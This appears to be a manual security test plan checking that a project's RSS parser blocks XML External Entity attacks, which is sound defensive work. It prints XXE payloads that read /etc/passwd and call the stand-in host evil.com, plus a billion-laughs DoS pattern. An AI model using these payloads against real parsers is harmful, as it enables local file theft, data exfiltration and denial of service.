# Layer 4: XXE Protection Test (Manual)

Tests that XML External Entity (XXE) attacks are blocked when parsing RSS feeds.

## What is XXE?

XXE attacks exploit XML parsers that process external entity references. A malicious RSS feed could include:

```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>
```

If the parser expands `&xxe;`, it would read `/etc/passwd` and include it in the parsed content.

## Why Manual?

Testing XXE requires:
- A controlled RSS feed with malicious XML
- Bypassing Layer 1 (domain whitelist) and Layer 2 (URL validation)
- Checking if the entity was expanded

## Test Steps

### Option A: Code Review (Quick Verification)

1. Check that `rss-parser` is used (it uses `xml2js` internally):
   ```typescript
   // packages/worker/src/utils/secure-rss.ts
   import Parser from "rss-parser";
   ```

2. Verify `xml2js` default settings:
   - By default, `xml2js` does NOT expand external entities
   - This is the safe default behavior
   - No explicit configuration needed

3. Check for any custom parser options that might enable XXE:
   ```bash
   # Search for dangerous options
   grep -r "xmlParserOptions" packages/worker/
   grep -r "noent" packages/worker/
   grep -r "external" packages/worker/
   ```

### Option B: Local Integration Test

1. Create a malicious RSS file:

   ```xml
   <!-- xxe-test.xml -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE rss [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
     <!ENTITY xxe2 SYSTEM "http://evil.com/steal?data=test">
   ]>
   <rss version="2.0">
     <channel>
       <title>XXE Test Feed</title>
       <link>http://example.com</link>
       <description>Testing XXE vulnerability</description>
       <item>
         <title>Item with XXE: &xxe;</title>
         <link>http://example.com/1</link>
         <description>This should NOT contain /etc/passwd contents</description>
       </item>
     </channel>
   </rss>
   ```

2. Serve it locally (requires adding localhost to whitelist - DO NOT do in production):
   ```bash
   npx serve -p 8888 .
   ```

3. Trigger a fetch and check the parsed content:
   - If `&xxe;` appears literally (not expanded) = SAFE
   - If `/etc/passwd` contents appear = VULNERABLE

### Option C: Unit Test the Parser

```typescript
// Quick test script
import Parser from "rss-parser";

const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <item>
      <title>Test &xxe;</title>
    </item>
  </channel>
</rss>`;

const parser = new Parser();
parser.parseString(maliciousXml).then(feed => {
  console.log("Title:", feed.title);
  console.log("Item title:", feed.items[0]?.title);

  // Check if entity was expanded
  if (feed.title?.includes("root:") || feed.title?.includes("/bin/")) {
    console.error("VULNERABLE: XXE entity was expanded!");
  } else {
    console.log("SAFE: XXE entity was NOT expanded");
  }
}).catch(err => {
  console.log("Parser rejected malicious XML:", err.message);
  console.log("SAFE: Malicious XML was rejected");
});
```

## Expected Behavior

| Scenario | Expected Result |
|----------|-----------------|
| `<!ENTITY xxe SYSTEM "file://...">` | Entity NOT expanded, appears as `&xxe;` or empty |
| `<!ENTITY xxe SYSTEM "http://...">` | No HTTP request made to external URL |
| Malformed XML with DOCTYPE | Parser may reject entirely (also safe) |

## Why rss-parser is Safe

The `rss-parser` library uses `xml2js` which:
1. Does NOT enable `noent` option by default
2. Does NOT process external entities
3. DTD declarations are parsed but entities are not resolved

## Additional XXE Vectors to Consider

```xml
<!-- Parameter entity (less common) -->
<!DOCTYPE rss [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]>

<!-- Billion laughs (DoS) -->
<!DOCTYPE rss [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
```

## Pass Criteria

- [ ] File-based XXE (`file://`) does not read local files
- [ ] HTTP-based XXE does not make external requests
- [ ] Parser rejects or safely ignores DOCTYPE declarations
- [ ] No sensitive data leakage in parsed content
